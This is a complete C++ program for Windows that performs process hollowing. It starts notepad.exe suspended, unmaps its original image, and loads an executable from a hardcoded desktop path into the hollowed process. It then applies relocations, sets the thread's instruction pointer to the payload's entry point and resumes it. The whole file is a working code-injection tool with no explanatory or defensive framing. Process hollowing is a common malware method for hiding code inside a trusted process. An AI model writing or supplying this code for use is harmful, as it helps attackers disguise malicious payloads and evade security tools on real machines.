#include <Windows.h>
#include <iostream>
#include <winternl.h>
#include <DbgHelp.h>

typedef NTSTATUS(NTAPI* pNtUnmapViewOfSection)(HANDLE ProcessHandle, PVOID BaseAddress);
typedef NTSTATUS(NTAPI* pNtQueryInformationProcess)(HANDLE, PROCESSINFOCLASS, PVOID, ULONG, PULONG);

typedef struct BASE_RELOCATION_BLOCK {
    DWORD PageAddress;
    DWORD BlockSize;
} BASE_RELOCATION_BLOCK, * PBASE_RELOCATION_BLOCK;

typedef struct BASE_RELOCATION_ENTRY {
    USHORT Offset : 12;
    USHORT Type : 4;
} BASE_RELOCATION_ENTRY, * PBASE_RELOCATION_ENTRY;

#define CountRelocationEntries(dwBlockSize) \
    (dwBlockSize - sizeof(BASE_RELOCATION_BLOCK)) / sizeof(BASE_RELOCATION_ENTRY)

int main() {
    printf("Creating process\n");

    LPSTARTUPINFOA pStartupInfo = new STARTUPINFOA();
    pStartupInfo->cb = sizeof(STARTUPINFOA);
    LPPROCESS_INFORMATION pProcessInfo = new PROCESS_INFORMATION();

    char cmdLine[] = "C:\\Windows\\System32\\notepad.exe";
    CreateProcessA(0, cmdLine, 0, 0, 0, CREATE_SUSPENDED, 0, 0, pStartupInfo, pProcessInfo);

    if (!pProcessInfo->hProcess) {
        printf("Error creating process: %lu\n", GetLastError());
        return 1;
    }

    HMODULE ntdll = GetModuleHandleA("ntdll.dll");
    pNtUnmapViewOfSection NtUnmapViewOfSection =
        (pNtUnmapViewOfSection)GetProcAddress(ntdll, "NtUnmapViewOfSection");
    pNtQueryInformationProcess NtQueryInformationProcess =
        (pNtQueryInformationProcess)GetProcAddress(ntdll, "NtQueryInformationProcess");

    PROCESS_BASIC_INFORMATION pbi = {};
    NtQueryInformationProcess(pProcessInfo->hProcess, ProcessBasicInformation, &pbi, sizeof(pbi), NULL);

    PVOID imageBase = nullptr;
    ReadProcessMemory(pProcessInfo->hProcess,
        (PBYTE)pbi.PebBaseAddress + offsetof(PEB, Reserved3[1]),
        &imageBase, sizeof(imageBase), NULL);
    printf("Target image base: %p\n", imageBase);

    NTSTATUS status = NtUnmapViewOfSection(pProcessInfo->hProcess, imageBase);
    printf("NtUnmapViewOfSection status: 0x%lX\n", status);

    HANDLE hFile = CreateFileA("C:\\Users\\user\\Desktop\\message2.exe", GENERIC_READ, 0, NULL, OPEN_EXISTING, 0, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        printf("Error opening payload: %lu\n", GetLastError());
        return 1;
    }

    DWORD fileSize = GetFileSize(hFile, NULL);
    if (fileSize == INVALID_FILE_SIZE || fileSize == 0) {
        printf("Error getting file size: %lu\n", GetLastError());
        return 1;
    }
    printf("Payload size: %lu bytes\n", fileSize);

    PBYTE pSourceImage = new BYTE[fileSize];
    DWORD dwBytesRead = 0;
    if (!ReadFile(hFile, pSourceImage, fileSize, &dwBytesRead, NULL) || dwBytesRead != fileSize) {
        printf("Error reading payload: %lu\n", GetLastError());
        return 1;
    }
    CloseHandle(hFile);
    printf("Payload loaded successfully\n");

    PIMAGE_NT_HEADERS64 pSourceHeaders =
        (PIMAGE_NT_HEADERS64)(pSourceImage + ((PIMAGE_DOS_HEADER)pSourceImage)->e_lfanew);

    printf("Allocating remote memory\n");
    PVOID pRemoteImage = VirtualAllocEx(
        pProcessInfo->hProcess,
        imageBase,
        pSourceHeaders->OptionalHeader.SizeOfImage,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_EXECUTE_READWRITE
    );
    if (!pRemoteImage) {
        printf("VirtualAllocEx failed: %lu\n", GetLastError());
        return 1;
    }
    printf("Remote memory allocated at: %p\n", pRemoteImage);

    PVOID newBase = pRemoteImage;
    if (!WriteProcessMemory(
        pProcessInfo->hProcess,
        (PBYTE)pbi.PebBaseAddress + offsetof(PEB, Reserved3[1]),
        &newBase,
        sizeof(newBase),
        NULL))
    {
        printf("Failed to update PEB image base: %lu\n", GetLastError());
        return 1;
    }
    printf("PEB.ImageBaseAddress updated to: %p\n", newBase);

    ULONGLONG dwDelta = (ULONGLONG)pRemoteImage - pSourceHeaders->OptionalHeader.ImageBase;
    printf("Source image base:      0x%llX\n", pSourceHeaders->OptionalHeader.ImageBase);
    printf("Destination image base: %p\n", imageBase);
    printf("Relocation delta:       0x%llX\n", dwDelta);

    pSourceHeaders->OptionalHeader.ImageBase = (ULONGLONG)pRemoteImage;

    printf("Writing headers\n");
    if (!WriteProcessMemory(pProcessInfo->hProcess, pRemoteImage, pSourceImage,
        pSourceHeaders->OptionalHeader.SizeOfHeaders, 0)) {
        printf("Error writing headers: %lu\n", GetLastError());
        return 1;
    }

    PIMAGE_SECTION_HEADER pSections = IMAGE_FIRST_SECTION(pSourceHeaders);
    for (DWORD x = 0; x < pSourceHeaders->FileHeader.NumberOfSections; x++) {
        if (!pSections[x].PointerToRawData)
            continue;

        PVOID pSectionDestination = (PVOID)((ULONG_PTR)pRemoteImage + pSections[x].VirtualAddress);
        printf("Writing %-8s section to %p\n", pSections[x].Name, pSectionDestination);

        if (!WriteProcessMemory(pProcessInfo->hProcess, pSectionDestination,
            &pSourceImage[pSections[x].PointerToRawData], pSections[x].SizeOfRawData, 0)) {
            printf("Error writing section: %lu\n", GetLastError());
            return 1;
        }
    }

    DWORD dwRelocAddr = 0;
    for (DWORD i = 0; i < pSourceHeaders->FileHeader.NumberOfSections; i++) {
        if (strcmp((char*)pSections[i].Name, ".reloc") == 0) {
            dwRelocAddr = pSections[i].PointerToRawData;
            break;
        }
    }

    IMAGE_DATA_DIRECTORY relocData =
        pSourceHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];

    if (dwRelocAddr != 0 && relocData.Size > 0) {
        printf("Applying relocations\n");
        DWORD dwOffset = 0;
        while (dwOffset < relocData.Size) {
            PBASE_RELOCATION_BLOCK pBlockHeader =
                (PBASE_RELOCATION_BLOCK)&pSourceImage[dwRelocAddr + dwOffset];
            dwOffset += sizeof(BASE_RELOCATION_BLOCK);

            DWORD dwEntryCount = CountRelocationEntries(pBlockHeader->BlockSize);
            PBASE_RELOCATION_ENTRY pBlocks =
                (PBASE_RELOCATION_ENTRY)&pSourceImage[dwRelocAddr + dwOffset];

            for (DWORD y = 0; y < dwEntryCount; y++) {
                dwOffset += sizeof(BASE_RELOCATION_ENTRY);
                if (pBlocks[y].Type == 0)
                    continue;

                DWORD dwFieldAddress = pBlockHeader->PageAddress + pBlocks[y].Offset;

                ULONGLONG qwBuffer = 0;
                ReadProcessMemory(pProcessInfo->hProcess,
                    (PVOID)((ULONG_PTR)pRemoteImage + dwFieldAddress),
                    &qwBuffer, sizeof(ULONGLONG), 0);

                qwBuffer += dwDelta;

                if (!WriteProcessMemory(pProcessInfo->hProcess,
                    (PVOID)((ULONG_PTR)pRemoteImage + dwFieldAddress),
                    &qwBuffer, sizeof(ULONGLONG), 0)) {
                    printf("Error writing relocation at 0x%08X: %lu\n", dwFieldAddress, GetLastError());
                }
            }
        }
        printf("Relocations applied\n");
    }
    else {
        printf("No relocations needed\n");
    }

    LPCONTEXT pContext = new CONTEXT();
    pContext->ContextFlags = CONTEXT_FULL;

    printf("Getting thread context\n");
    if (!GetThreadContext(pProcessInfo->hThread, pContext)) {
        printf("Error getting context: %lu\n", GetLastError());
        return 1;
    }

    ULONG_PTR entryPoint = (ULONG_PTR)pRemoteImage + pSourceHeaders->OptionalHeader.AddressOfEntryPoint;
    printf("Entry point: %p\n", (PVOID)entryPoint);

    pContext->Rip = entryPoint;
    
    //CONTEXT nestedCtx = {};
    //ReadProcessMemory(
    //    pProcessInfo->hProcess,
    //    (PVOID)pContext->Rcx,
    //    &nestedCtx,
    //    sizeof(nestedCtx),
    //    NULL
    //);

    //nestedCtx.Rip = entryPoint;

    //WriteProcessMemory(
    //    pProcessInfo->hProcess,
    //    (PVOID)pContext->Rcx,
    //    &nestedCtx,
    //    sizeof(nestedCtx),
    //    NULL
    //);

    printf("Setting thread context\n");
    if (!SetThreadContext(pProcessInfo->hThread, pContext)) {
        printf("Error setting context: %lu\n", GetLastError());
        return 1;
    }

    printf("Resuming thread\n");
    if (!ResumeThread(pProcessInfo->hThread)) {
        printf("Error resuming thread: %lu\n", GetLastError());
        return 1;
    }

    return 0;
}